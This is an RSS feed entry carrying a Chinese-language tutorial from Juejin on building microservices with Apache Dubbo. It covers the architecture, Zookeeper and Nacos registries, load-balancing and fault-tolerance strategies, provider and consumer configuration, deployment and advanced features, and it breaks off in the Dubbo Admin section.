<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Dubbo微服务实战]]></title>    <link>https://juejin.cn/post/7593139476833157163</link>    <guid>https://juejin.cn/post/7593139476833157163</guid>    <pubDate>2026-01-09T06:17:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476833157163" data-draft-id="7592887786966761508" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Dubbo微服务实战"/> <meta itemprop="keywords" content="Dubbo"/> <meta itemprop="datePublished" content="2026-01-09T06:17:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Dubbo微服务实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:17:28.000Z" title="Fri Jan 09 2026 06:17:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Dubbo微服务实战</h2>
<h2 data-id="heading-1">前言</h2>
<p>在微服务架构盛行的今天，分布式服务调用成为了企业级应用开发的标配。Apache Dubbo作为阿里巴巴开源的高性能、轻量级的RPC（远程过程调用）框架，在国内拥有广泛的应用场景。</p>
<h2 data-id="heading-2">一、Dubbo简介</h2>
<h3 data-id="heading-3">1.1 什么是Dubbo？</h3>
<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：</p>
<ul>
<li><strong>面向接口的远程方法调用</strong>：像调用本地方法一样调用远程服务</li>
<li><strong>智能容错和负载均衡</strong>：内置多种负载均衡策略和容错机制</li>
<li><strong>服务自动注册与发现</strong>：支持多种注册中心，实现服务的自动注册和发现</li>
</ul>
<h3 data-id="heading-4">1.2 Dubbo的发展历程</h3>
<ul>
<li>2011年：阿里巴巴开源Dubbo 2.0</li>
<li>2014年：Dubbo进入维护期</li>
<li>2017年：阿里巴巴重启Dubbo开发</li>
<li>2019年：Dubbo成为Apache顶级项目</li>
<li>2023年：发布Dubbo 3.x系列，全面支持云原生</li>
</ul>
<h3 data-id="heading-5">1.3 为什么选择Dubbo？</h3>
<p><strong>对比Spring Cloud的优势：</strong></p>



































<table><thead><tr><th>特性</th><th>Dubbo</th><th>Spring Cloud</th></tr></thead><tbody><tr><td>通信协议</td><td>Dubbo协议（性能更优）</td><td>HTTP REST</td></tr><tr><td>序列化</td><td>Hessian2（效率高）</td><td>JSON</td></tr><tr><td>服务调用</td><td>RPC（透明）</td><td>REST API</td></tr><tr><td>学习曲线</td><td>较低</td><td>较高</td></tr><tr><td>社区活跃度</td><td>国内为主</td><td>国际化</td></tr></tbody></table>
<h2 data-id="heading-6">二、Dubbo核心架构</h2>
<h3 data-id="heading-7">2.1 系统架构图</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a541008a7a74bcdbcc71fad848a65eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=ivotqTH%2BebmxfJK1JA3mMKkrcOk%3D" alt="" loading="lazy"/></p>
<p>上图展示了完整的Dubbo微服务六层架构，从客户端到数据层的完整调用链路。Dubbo的架构设计非常清晰，主要包含以下角色：</p>
<ul>
<li><strong>Registry（注册中心）</strong> ：负责服务的注册与发现</li>
<li><strong>Provider（服务提供者）</strong> ：暴露服务的应用</li>
<li><strong>Consumer（服务消费者）</strong> ：调用远程服务的应用</li>
<li><strong>Monitor（监控中心）</strong> ：统计服务调用次数和调用时间</li>
<li><strong>Container（服务容器）</strong> ：负责启动、加载和运行服务</li>
</ul>
<h3 data-id="heading-8">2.2 服务调用时序图</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77e1484bc0c3476390d69d6b80ff0452~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=mtaD2Ig1tY9bl6PnxGglANXKVWM%3D" alt="" loading="lazy"/></p>
<p>从时序图中可以看到，一个完整的Dubbo服务调用包含以下步骤：</p>
<ol>
<li><strong>客户端发起HTTP请求</strong>到Consumer</li>
<li><strong>Consumer向Registry订阅服务</strong>，获取Provider列表</li>
<li><strong>Registry返回可用的Provider地址列表</strong></li>
<li><strong>Consumer根据负载均衡策略选择一个Provider</strong></li>
<li><strong>通过Dubbo协议进行RPC调用</strong>（默认端口20880）</li>
<li><strong>Provider查询数据并返回结果</strong></li>
<li><strong>Consumer将结果以HTTP响应返回给客户端</strong></li>
</ol>
<h3 data-id="heading-9">2.3 Dubbo工作原理</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7198cf5c9e24ec2a612bb8ad83d67e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=FoOfP62BMZQMeI8h6fz%2FHEgGJtA%3D" alt="" loading="lazy"/></p>
<p>Dubbo采用分层架构设计，从上到下共9层：</p>
<ol>
<li><strong>Service层（业务层）</strong> ：接口和实现定义，如UserService、OrderService</li>
<li><strong>Config层（配置层）</strong> ：@DubboService、@DubboReference等配置</li>
<li><strong>Proxy层（代理层）</strong> ：服务接口代理，透明化远程调用</li>
<li><strong>Registry层（注册层）</strong> ：服务的注册与发现</li>
<li><strong>Cluster层（集群层）</strong> ：负载均衡、容错处理</li>
<li><strong>Protocol层（协议层）</strong> ：RPC调用封装</li>
<li><strong>Exchange层（交换层）</strong> ：请求响应映射</li>
<li><strong>Network层（网络层）</strong> ：Netty、Mina等网络通信</li>
<li><strong>Serialize层（序列化层）</strong> ：Hessian2、JSON等数据序列化</li>
</ol>
<p>这种分层设计使得Dubbo具有良好的扩展性，每一层都可以独立替换和优化。</p>
<h2 data-id="heading-10">三、服务注册与发现</h2>
<h3 data-id="heading-11">3.1 服务注册发现流程</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9718a2344e71428ca918ae8740277ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=gs2U0wq2TYMbNmjRdJzivysTYz4%3D" alt="" loading="lazy"/></p>
<p>服务注册与发现是Dubbo的核心机制，分为两个流程：</p>
<p><strong>Provider注册流程：</strong></p>
<ol>
<li>Provider服务启动</li>
<li>连接到Zookeeper注册中心</li>
<li>注册服务接口、版本、分组等信息</li>
<li>订阅配置变更</li>
<li>暴露Dubbo服务（默认20880端口）</li>
</ol>
<p><strong>Consumer发现流程：</strong></p>
<ol>
<li>Consumer服务启动</li>
<li>连接到Zookeeper注册中心</li>
<li>订阅所需的服务接口</li>
<li>获取Provider地址列表</li>
<li>根据负载均衡策略调用Provider</li>
</ol>
<h3 data-id="heading-12">3.2 Zookeeper配置</h3>
<p>Zookeeper是Dubbo最常用的注册中心：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载Zookeeper</span>
wget https://downloads.apache.org/zookeeper/

<span class="hljs-comment"># 启动Zookeeper</span>
bin/zkServer.sh start
</code></pre>
<p><strong>配置参数：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dubbo:</span>
  <span class="hljs-attr">registry:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-string">zookeeper://127.0.0.1:2181</span>
    <span class="hljs-attr">sessiontimeout:</span> <span class="hljs-number">60000</span>
    <span class="hljs-attr">register:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">subscribe:</span> <span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-13">3.3 其他注册中心</h3>
<p>Dubbo还支持：</p>
<ul>
<li><strong>Nacos</strong>：阿里开源，功能更强大，支持配置管理</li>
<li><strong>Redis</strong>：轻量级选择，适合小规模应用</li>
<li><strong>Consul</strong>：支持健康检查和服务网格</li>
</ul>
<p><strong>Nacos配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dubbo:</span>
  <span class="hljs-attr">registry:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-string">nacos://127.0.0.1:8848</span>
</code></pre>
<h2 data-id="heading-14">四、负载均衡策略</h2>
<h3 data-id="heading-15">4.1 负载均衡原理</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a12ae92e4829450081eb203bd6526322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=JkuCIlveyLj3rQbDjdyIz6%2F%2FiXI%3D" alt="" loading="lazy"/></p>
<p>Dubbo提供多种负载均衡策略，可以根据业务场景选择：</p>








































<table><thead><tr><th>策略</th><th>说明</th><th>适用场景</th></tr></thead><tbody><tr><td>Random（随机）</td><td>随机选择Provider</td><td>默认策略，Provider性能相近</td></tr><tr><td>RoundRobin（轮询）</td><td>按顺序轮流调用</td><td>Provider性能相近，请求均匀分布</td></tr><tr><td>LeastActive（最少活跃）</td><td>选择活跃数最少的Provider</td><td>Provider性能差异大</td></tr><tr><td>ConsistentHash（一致性哈希）</td><td>相同参数路由到同一Provider</td><td>有状态服务，如用户会话</td></tr><tr><td>WeightedRandom（加权随机）</td><td>根据权重随机选择</td><td>Provider性能不同</td></tr><tr><td>ShortestResponse（最短响应）</td><td>选择响应时间最短的Provider</td><td>对性能要求高</td></tr></tbody></table>
<h3 data-id="heading-16">4.2 配置示例</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 服务端配置</span>
<span class="hljs-variable">@DubboService</span>(loadbalance = <span class="hljs-string">"random"</span>)
public class UserServiceImpl implements UserService {}

<span class="hljs-comment">// 客户端配置</span>
<span class="hljs-variable">@DubboReference</span>(loadbalance = <span class="hljs-string">"roundrobin"</span>)
private UserService userService;

# 全局配置
<span class="hljs-selector-tag">dubbo</span>:
  <span class="hljs-selector-tag">provider</span>:
    <span class="hljs-selector-tag">loadbalance</span>: <span class="hljs-selector-tag">random</span>
  <span class="hljs-selector-tag">consumer</span>:
    <span class="hljs-selector-tag">loadbalance</span>: <span class="hljs-selector-tag">random</span>
</code></pre>
<h2 data-id="heading-17">五、集群容错机制</h2>
<h3 data-id="heading-18">5.1 容错策略</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54ab60d3de74519baf054c8dd4b6ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=R2hgBAhH59SFZmoRWZUhH2xNyII%3D" alt="" loading="lazy"/></p>
<p>Dubbo提供6种集群容错策略，保证服务的高可用性：</p>








































<table><thead><tr><th>策略</th><th>说明</th><th>适用场景</th></tr></thead><tbody><tr><td>Failover（失败自动切换）</td><td>失败后重试其他Provider</td><td>默认策略，幂等操作</td></tr><tr><td>Failfast（快速失败）</td><td>失败后立即报错，不重试</td><td>非幂等操作，如写操作</td></tr><tr><td>Failsafe（失败安全）</td><td>失败后忽略，不报错</td><td>日志记录、审计等非关键操作</td></tr><tr><td>Failback（失败自动恢复）</td><td>失败后后台重试</td><td>消息通知、异步任务</td></tr><tr><td>Forking（并行调用）</td><td>并行调用多个Provider，返回成功结果</td><td>对实时性要求高的读操作</td></tr><tr><td>Broadcast（广播调用）</td><td>广播调用所有Provider</td><td>通知所有Provider更新缓存</td></tr></tbody></table>
<h3 data-id="heading-19">5.2 Failover流程详解</h3>
<p>从图中可以看到Failover（最常用的容错策略）的工作流程：</p>
<ol>
<li>Consumer调用Provider A</li>
<li>Provider A失败（超时/异常）</li>
<li>自动重试Provider B（基于负载均衡）</li>
<li>Provider B失败</li>
<li>自动重试Provider C</li>
<li>Provider C成功，返回结果</li>
</ol>
<h3 data-id="heading-20">5.3 配置示例</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 服务端配置</span>
<span class="hljs-variable">@DubboService</span>(
    cluster = <span class="hljs-string">"failover"</span>,
    retries = <span class="hljs-number">2</span>  <span class="hljs-comment">// 重试次数</span>
)
public class UserServiceImpl implements UserService {}

<span class="hljs-comment">// 客户端配置</span>
<span class="hljs-variable">@DubboReference</span>(
    cluster = <span class="hljs-string">"failfast"</span>,  <span class="hljs-comment">// 快速失败</span>
    retries = <span class="hljs-number">0</span>            <span class="hljs-comment">// 不重试</span>
)
private UserService userService;
</code></pre>
<p><strong>重试策略建议：</strong></p>
<ul>
<li>查询操作：可以重试2-3次（Failover）</li>
<li>写操作：建议不重试（Failfast）</li>
<li>重要业务：谨慎设置重试次数</li>
</ul>
<h2 data-id="heading-21">六、实战项目构建</h2>
<h3 data-id="heading-22">6.1 定义服务接口</h3>
<p>dubbo-api模块定义了所有服务的接口，这是Provider和Consumer之间的契约。</p>
<p><strong>用户服务接口：</strong></p>
<pre><code class="hljs language-scss" lang="scss">public interface UserService {
    User <span class="hljs-built_in">getUserById</span>(Long userId);
    Long <span class="hljs-built_in">createUser</span>(User user);
    boolean <span class="hljs-built_in">updateUser</span>(User user);
    boolean <span class="hljs-built_in">deleteUser</span>(Long userId);
    List&lt;User&gt; <span class="hljs-built_in">getAllUsers</span>();
}
</code></pre>
<p><strong>注意事项：</strong></p>
<ol>
<li>服务接口必须保持稳定，避免频繁修改</li>
<li>参数和返回值必须实现Serializable接口</li>
<li>建议使用Java对象作为参数和返回值，便于序列化</li>
</ol>
<h3 data-id="heading-23">6.2 实现服务提供者</h3>
<p>使用<code>@DubboService</code>注解暴露服务：</p>
<pre><code class="hljs language-ini" lang="ini">@DubboService(
    <span class="hljs-attr">version</span> = <span class="hljs-string">"1.0.0"</span>,
    <span class="hljs-attr">group</span> = <span class="hljs-string">"user-service"</span>,
    <span class="hljs-attr">timeout</span> = <span class="hljs-number">5000</span>,
    <span class="hljs-attr">retries</span> = <span class="hljs-number">2</span>,
    <span class="hljs-attr">loadbalance</span> = <span class="hljs-string">"roundrobin"</span>
)
public class UserServiceImpl implements UserService {
    // 实现代码
}
</code></pre>
<p><strong>核心配置参数说明：</strong></p>



































<table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>version</td><td>服务版本号</td><td>-</td></tr><tr><td>group</td><td>服务分组</td><td>-</td></tr><tr><td>timeout</td><td>超时时间(毫秒)</td><td>1000</td></tr><tr><td>retries</td><td>失败重试次数</td><td>2</td></tr><tr><td>loadbalance</td><td>负载均衡策略</td><td>random</td></tr></tbody></table>
<h3 data-id="heading-24">6.3 服务提供者配置</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dubbo:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">dubbo-provider</span>
  <span class="hljs-attr">protocol:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">dubbo</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">20880</span>
    <span class="hljs-attr">serialization:</span> <span class="hljs-string">hessian2</span>
  <span class="hljs-attr">registry:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-string">zookeeper://127.0.0.1:2181</span>
  <span class="hljs-attr">provider:</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-number">5000</span>
    <span class="hljs-attr">retries:</span> <span class="hljs-number">2</span>
    <span class="hljs-attr">loadbalance:</span> <span class="hljs-string">random</span>
</code></pre>
<h3 data-id="heading-25">6.4 实现服务消费者</h3>
<p>使用<code>@DubboReference</code>注解引用远程服务：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api/users"</span>)
public class UserController {

    <span class="hljs-variable">@DubboReference</span>(
        version = <span class="hljs-string">"1.0.0"</span>,
        group = <span class="hljs-string">"user-service"</span>,
        check = false
    )
    private UserService userService;

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/{id}"</span>)
    public String <span class="hljs-built_in">getUserById</span>(<span class="hljs-variable">@PathVariable</span> Long id) {
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">user</span> != <span class="hljs-selector-tag">null</span> ? <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.toString</span>() : "用户不存在";
    }
}
</code></pre>
<h3 data-id="heading-26">6.5 服务消费者配置</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dubbo:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">dubbo-consumer</span>
  <span class="hljs-attr">registry:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-string">zookeeper://127.0.0.1:2181</span>
  <span class="hljs-attr">consumer:</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-number">5000</span>
    <span class="hljs-attr">retries:</span> <span class="hljs-number">2</span>
    <span class="hljs-attr">check:</span> <span class="hljs-literal">false</span>
</code></pre>
<h2 data-id="heading-27">七、服务间调用</h2>
<h3 data-id="heading-28">7.1 服务间通信示例</h3>
<p>在订单服务中调用用户服务：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@DubboService</span>
public class OrderServiceImpl implements OrderService {

    <span class="hljs-keyword">@DubboReference</span>
    private UserService userService;

    public Long <span class="hljs-built_in">createOrder</span>(Order order) {
        <span class="hljs-comment">// 1. 验证用户是否存在</span>
        User user = userService<span class="hljs-selector-class">.getUserById</span>(order.getUserId());
        if (user == null) {
            throw new <span class="hljs-built_in">RuntimeException</span>("用户不存在");
        }

        <span class="hljs-comment">// 2. 创建订单</span>
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setId</span>(ID_GENERATOR.getAndIncrement());
        ORDER_DATABASE<span class="hljs-selector-class">.put</span>(order.getId(), <span class="hljs-attribute">order</span>);

        return <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getId</span>();
    }
}
</code></pre>
<p><strong>生产环境注意事项：</strong></p>
<ol>
<li>服务间调用要设置合理的超时时间</li>
<li>考虑熔断机制，防止雪崩效应</li>
<li>重要业务逻辑要记录日志</li>
<li>使用分布式追踪系统监控调用链</li>
</ol>
<h2 data-id="heading-29">八、生产环境部署</h2>
<h3 data-id="heading-30">8.1 微服务部署架构</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db13f1817aa4ab5b36dbd21c22d303b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544248&amp;x-signature=IVGmg9xj%2FlorA%2BFetz1eEB4SO4s%3D" alt="" loading="lazy"/></p>
<p>生产环境通常采用多数据中心部署，提高系统的可用性和容灾能力：</p>
<p><strong>北京数据中心（Data Center 1）：</strong></p>
<ul>
<li>3个Provider实例（192.168.1.101-103）</li>
<li>2个Consumer实例（192.168.1.201-202）</li>
<li>3节点Zookeeper集群</li>
</ul>
<p><strong>上海数据中心（Data Center 2）：</strong></p>
<ul>
<li>2个Provider实例（192.168.2.101-102）</li>
<li>2个Consumer实例（192.168.2.201-202）</li>
<li>MySQL主从集群、Redis集群</li>
</ul>
<p><strong>跨数据中心连接：</strong></p>
<ul>
<li>通过VPN或专线连接</li>
<li>实现异地多活和容灾</li>
</ul>
<h3 data-id="heading-31">8.2 高可用部署</h3>
<p><strong>注册中心集群：</strong></p>
<ul>
<li>Zookeeper至少3个节点（奇数个）</li>
<li>Nacos集群模式部署</li>
</ul>
<p><strong>服务部署：</strong></p>
<ul>
<li>Provider至少部署2个实例</li>
<li>使用Docker容器化部署</li>
</ul>
<p><strong>数据库：</strong></p>
<ul>
<li>MySQL主从复制</li>
<li>Redis Cluster集群</li>
</ul>
<h3 data-id="heading-32">8.3 配置中心</h3>
<p>生产环境建议引入配置中心（如Nacos、Apollo）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 从配置中心读取</span>
<span class="hljs-attr">dubbo:</span>
  <span class="hljs-attr">registry:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-string">${dubbo.registry.address:zookeeper://127.0.0.1:2181}</span>
  <span class="hljs-attr">protocol:</span>
    <span class="hljs-attr">port:</span> <span class="hljs-string">${dubbo.protocol.port:20880}</span>
</code></pre>
<h2 data-id="heading-33">九、高级特性</h2>
<h3 data-id="heading-34">9.1 异步调用</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@DubboReference</span>(<span class="hljs-keyword">async</span> = <span class="hljs-literal">true</span>)
<span class="hljs-keyword">private</span> <span class="hljs-title class_">UserService</span> userService;

<span class="hljs-keyword">public</span> <span class="hljs-title class_">CompletableFuture</span>&lt;<span class="hljs-title class_">User</span>&gt; <span class="hljs-title function_">getUserAsync</span>(<span class="hljs-params">Long id</span>) {
    <span class="hljs-keyword">return</span> userService.<span class="hljs-title function_">getUserById</span>(id);
}
</code></pre>
<h3 data-id="heading-35">9.2 泛化调用</h3>
<p>无需依赖接口JAR包即可调用：</p>
<pre><code class="hljs language-ini" lang="ini">GenericService <span class="hljs-attr">genericService</span> = (GenericService) context.getBean(<span class="hljs-string">"genericService"</span>)<span class="hljs-comment">;</span>

Object <span class="hljs-attr">result</span> = genericService.<span class="hljs-variable">$invoke</span>(
    "getUserById",
    new String<span class="hljs-section">[]</span>{"java.lang.Long"},
    new Object<span class="hljs-section">[]</span>{1L}
)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-36">9.3 服务降级</h3>
<p>通过Mock实现服务降级：</p>
<pre><code class="hljs language-ini" lang="ini">@DubboReference(<span class="hljs-attr">mock</span> = <span class="hljs-string">"com.dubbo.demo.mock.UserServiceMock"</span>)
private UserService userService<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-37">9.4 结果缓存</h3>
<pre><code class="hljs language-ini" lang="ini">@DubboReference(<span class="hljs-attr">cache</span> = <span class="hljs-string">"lru"</span>)
private UserService userService<span class="hljs-comment">;</span>
</code></pre>
<p><strong>缓存策略：</strong></p>
<ul>
<li><code>lru</code>：最近最少使用</li>
<li><code>threadlocal</code>：线程缓存</li>
<li><code>jcache</code>：与JSR107集成</li>
</ul>
<h2 data-id="heading-38">十、监控与运维</h2>
<h3 data-id="heading-39">10.1 Dubbo Admin</h3>
<p>Dubbo Admin是官方提供的管理控制台：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载并启动</span>
git <span class="hljs-built_in">clone</span> https://github.com/apache/dubbo-admin
mvn clean package
